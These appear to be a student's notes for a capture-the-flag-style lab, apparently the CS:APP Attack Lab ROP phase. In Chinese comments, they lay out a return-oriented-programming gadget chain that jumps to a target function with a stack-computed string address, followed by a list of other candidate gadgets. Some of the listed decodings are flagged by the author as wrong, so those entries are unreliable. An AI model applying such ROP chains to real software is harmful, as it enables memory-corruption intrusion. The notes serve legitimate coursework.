401a06: 48 89 e0 c3             movq	%rsp, %rax          # 将栈顶位置存入rax
4019a2: 48 89 c7 c3             movq	%rax, %rdi          # 将栈顶位置存入rdi
401383: 5e c3                   pop %rsi                    # 将偏移存入rsi
4019d6: 48 8d 04 37 c3          lea    (%rdi,%rsi,1),%rax   # 计算字符串首地址，存入rax
4019a2: 48 89 c7 c3             movq	%rax, %rdi          # 将首地址存入rdi
4017bd: c3                      ret                         # 插入一个ret，对齐rsp，并跳转到touch3
4018fa: touch3首地址                                         # ret跳转到touch3


# 以下是一些找到的其他的gadget（除了farm中可以找，其他地方也可以找）
# 注意：使用网站进行反汇编时，由于反汇编工具处理末尾不能识别的二进制码时，不会显示报错信息，可能会导致一些错误的gadget，注意识别
# 比如 89 d1 48 c0中，48 c0为不完整的指令，但https://xfreetool.com/zh/x86-converter不hi报错
5f c3
popq    %rdi

48 83 c4 08
add   $0x8,%rsp

48 89 c7
movq	%rax, %rdi

89 c7
movl	%eax, %edi

58 90
popq	%rax nop

48 89 c7 c7
movq	%rax, %rdi

58 92
popq	%rax
xchgl	%eax, %edx

00 00
addb	%al, (%rax)

8d 04 37
leal	(%rdi, %rsi), %eax

04 37
addb	$0x37, %al

5c 89 c2 90
popq	%rsp
movl	%eax, %edx
nop

99 d1 90 90
cltd

d1 20 db 错误
shll	(%rax)

89 d1 48 c0 错误
movl	%edx, %ecx

 87 41 48 89 e0
xchgl	%eax, 0x48(%rcx)
movl	%esp, %eax

48 89 e0
movq	%rsp, %rax

89 e0
movl	%esp, %eax

 89 ce 90 90
 movl	%ecx, %esi

 89 c2 00 c9
 movl	%eax, %edx
addb	%cl, %cl

89 ce 38 c0
movl	%ecx, %esi
cmpb	%al, %al

89 c2 84 c0
movl	%eax, %edx
testb	%al, %al


48 89 e0 91
movq	%rsp, %rax
xchgl	%eax, %ecx

89 ce 92
movl	%ecx, %esi
xchgl	%eax, %edx

87 08 89 e0 90
xchgl	%ecx, (%rax)
movl	%esp, %eax
nop

55 60 00 00
pushq	%rbp

83 c4 08
addl	$8, %esp

83 c0 01
add    $0x1,%eax
